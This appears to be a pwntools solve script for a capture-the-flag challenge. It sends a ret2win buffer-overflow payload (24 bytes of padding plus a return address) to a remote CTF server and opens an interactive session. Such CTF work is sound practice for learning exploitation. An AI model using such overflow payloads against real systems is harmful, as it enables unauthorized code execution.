from pwn import *

context.binary = './chall'
elf = context.binary

OFFSET = 24
WIN_ADDRESS = 0x401187

io = remote('ctf.compfest.id', 7004)
# io = process('./chall')
log.info("Connected to remote")

payload = b'A' * OFFSET + p64(WIN_ADDRESS)
log.info(f"Sending payload: {repr(payload)}")

io.recvuntil(b'>> ')
io.sendline(payload)

# Ganti recvall dengan interactive untuk lihat output langsung
io.interactive()
